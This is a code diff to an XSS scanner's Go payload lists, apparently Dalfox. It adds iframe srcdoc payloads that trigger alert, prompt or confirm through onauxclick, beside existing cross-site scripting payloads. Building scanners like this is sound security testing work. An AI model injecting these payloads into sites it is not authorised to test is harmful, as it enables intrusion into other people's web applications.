@@ -160,6 +160,7 @@ func getCommonPayload() []string {
 		"'><img/src/onerror=.1|alert`` class=dalfox>",
 		"'\"><svg/class=dalfox onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
 		"</script><svg><script/class=dalfox>alert(DALFOX_ALERT_VALUE)</script>-%26apos;",
+		"'\"><iframe srcdoc=\"<input onauxclick=alert(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
 
 		// not include verify payload
 		"\"><svg/OnLoad=\"`${prompt``}`\">",
@@ -205,6 +206,9 @@ func getHTMLPayload(ip string) []string {
 		"<div contextmenu=xss><p>1<menu type=context onshow=alert(DALFOX_ALERT_VALUE)></menu></div>",
 		"<iFrAme/src=jaVascRipt:alert(DALFOX_ALERT_VALUE)></iFramE>",
 		"<xmp><p title=\"</xmp><svg/onload=alert(DALFOX_ALERT_VALUE)>",
+		"<iframe srcdoc=\"<input onauxclick=alert(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
+		"<iframe srcdoc=\"<input onauxclick=prompt(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
+		"<iframe srcdoc=\"<input onauxclick=confirm(DALFOX_ALERT_VALUE)>\" class=dalfox></iframe>",
 	}
 	if strings.Contains(ip, "comment") {
 		// TODO add comment payloads
